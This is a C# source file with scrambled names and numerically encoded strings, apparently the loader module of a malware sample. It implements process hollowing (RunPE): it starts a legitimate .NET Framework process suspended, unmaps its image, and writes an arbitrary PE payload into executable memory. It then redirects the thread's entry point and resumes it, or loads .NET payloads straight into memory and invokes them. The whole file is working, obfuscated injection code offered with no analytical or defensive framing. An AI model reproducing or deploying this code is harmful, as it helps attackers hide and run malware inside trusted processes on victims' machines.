using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace adudule;

internal class pGJMEcrkUDFZCHURzNmmOWjLeKizazLFXHdNYealDRZa
{
	private delegate bool ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi1(string ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, string ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx7, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6, bool ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5, int ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx4, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx3, string ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx2, byte[] ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx1, IntPtr[] ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx0);

	private delegate bool ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi2(IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, uint[] ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8);

	private delegate uint ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi3(IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8);

	private delegate bool ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi4(IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8, ref IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx7, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6, ref IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5);

	private delegate int ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi5(IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0);

	private delegate IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi6(IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx7, int ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6, int ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5);

	private delegate bool ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi8(IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8, byte[] ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx7, IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6, ref IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5);

	[DebuggerNonUserCode]
	public pGJMEcrkUDFZCHURzNmmOWjLeKizazLFXHdNYealDRZa()
	{
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	private static T NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<T>(string ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, string ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0), ref ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8), typeof(T));
	}

	public static void kIDghOVnvlRMNLQBIPfHGWMPGfInkTHcSJXhQQDDemzb(byte[] ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0)
	{
		string p = string.Empty;
		string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|80|114|109|127|132|122|133|141|137|114|99|127|121|136|133|137|133|124|138|68|100|91|106|114|92|136|119|131|123|141|133|136|129|"));
		foreach (string text in directories)
		{
			if (text.Contains(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|140|72|68|70|68|")))
			{
				p = text + EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|114|140|120|121|68|123|142|123|");
				break;
			}
		}
		kIDghOVnvlRMNLQBIPfHGWMPGfInkTHcSJXhQQDDemzb(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, p);
	}

	public static void kIDghOVnvlRMNLQBIPfHGWMPGfInkTHcSJXhQQDDemzb(byte[] ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, string P)
	{
		if (ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0[60] == 128)
		{
			Thread thread = new Thread(NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0);
			return;
		}
		int[] array = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
		int num = BitConverter.ToInt32(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, 60);
		checked
		{
			int num2 = BitConverter.ToInt16(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, num + 6);
			IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx = new IntPtr(BitConverter.ToInt32(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, num + 84));
			byte[] ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx2 = new byte[68];
			IntPtr[] array2 = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi1>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|136|183|170|166|185|170|149|183|180|168|170|184|184|134|"))(null, P, intPtr, intPtr, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5: false, 4, intPtr, null, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx2, array2))
			{
				return;
			}
			uint[] array3 = new uint[179];
			array3[0] = 65538u;
			if (NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi2>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|140|170|185|153|173|183|170|166|169|136|180|179|185|170|189|185|"))(array2[1], array3))
			{
				ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi4 ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi = NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi4>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|151|170|166|169|149|183|180|168|170|184|184|146|170|178|180|183|190|"));
				IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi2 = array2[0];
				IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx3 = new IntPtr(unchecked((long)array3[41]) + 8L);
				IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx4 = new IntPtr(4);
				IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5 = default(IntPtr);
				IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6 = default(IntPtr);
				if (ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi2, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx3, ref ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx4, ref ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6) && unchecked((long)NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi3>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|132|138|122|130|130|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|147|185|154|179|178|166|181|155|174|170|188|148|171|152|170|168|185|174|180|179|"))(array2[0], ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx5)) == 0L)
				{
					ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi6 ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi3 = NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi6>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|155|174|183|185|186|166|177|134|177|177|180|168|138|189|"));
					IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi4 = array2[0];
					IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, num + 52));
					IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx7 = intPtr2;
					IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8 = new IntPtr(BitConverter.ToInt32(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, num + 80));
					IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx9 = ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi3(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi4, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx7, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8, 12288, 64);
					ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi8 ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi5 = NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi8>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|156|183|174|185|170|149|183|180|168|170|184|184|146|170|178|180|183|190|"));
					ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi5(array2[0], ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx9, ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx, ref ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6);
					int num3 = Convert.ToInt32(Conversions.ToString(101000), 2);
					int num4 = num2 - 1;
					int num5 = 0;
					while (true)
					{
						int num6 = num5;
						int num7 = num4;
						if (num6 > num7)
						{
							break;
						}
						int[] array4 = new int[10];
						int num8 = Convert.ToInt32(Conversions.ToString(11111000), 2);
						Buffer.BlockCopy(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, num + num8 + num5 * num3, array4, 0, num3);
						byte[] array5 = new byte[array4[Convert.ToInt32(Conversions.ToString(100), 2)] - 1 + 1];
						IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx10 = new IntPtr(ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx9.ToInt32() + array4[Convert.ToInt32(Conversions.ToString(11), 2)]);
						int num9 = array5.Length;
						IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx11 = new IntPtr(num9);
						Buffer.BlockCopy(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, array4[5], array5, 0, num9);
						ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi5(array2[0], ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx10, array5, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx11, ref ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6);
						num5++;
					}
					IntPtr ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi6 = array2[0];
					ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8 = new IntPtr(unchecked((long)array3[41]) + 8L);
					IntPtr ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx12 = ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx8;
					byte[] bytes = BitConverter.GetBytes(ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx9.ToInt32());
					intPtr2 = new IntPtr(Convert.ToInt32(Conversions.ToString(100), 2));
					ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi5(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi6, ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx12, bytes, intPtr2, ref ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx6);
					array3[44] = (uint)(ouqCTUpqBYFiyelFNChddbgSLSwXJYcfXvYEnjYsiZnx9.ToInt32() + BitConverter.ToInt32(ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi0, num + num3));
					NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi2>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|105|123|138|106|126|136|123|119|122|89|133|132|138|123|142|138|"))(array2[1], array3);
				}
			}
			NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd<ggTGhDQeMdPTsheYqnLgFLHSWkGIRbVyPhCVPFkttswi5>(EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("69|176|170|183|179|170|177|120|119|"), EloJlpEOjwjWxUSuctfjJjuoHEbwVNKVmBWKTrmPRxSX.ZPdnWWJKktGiCgFXjXUOgdBkuBwJZavxHeMpFlrLTJoj("22|104|123|137|139|131|123|106|126|136|123|119|122|"))(array2[1]);
		}
	}

	private static void NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd(object NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd)
	{
		MethodInfo entryPoint = Assembly.Load((byte[])NLQBIPfHGWMPGfInkTHcSJXhQQDDemzbuayQcROIaXtd).EntryPoint;
		if (entryPoint.GetParameters().Length == 1)
		{
			entryPoint.Invoke(null, new object[1] { new string[0] });
		}
		else
		{
			entryPoint.Invoke(null, null);
		}
	}
}
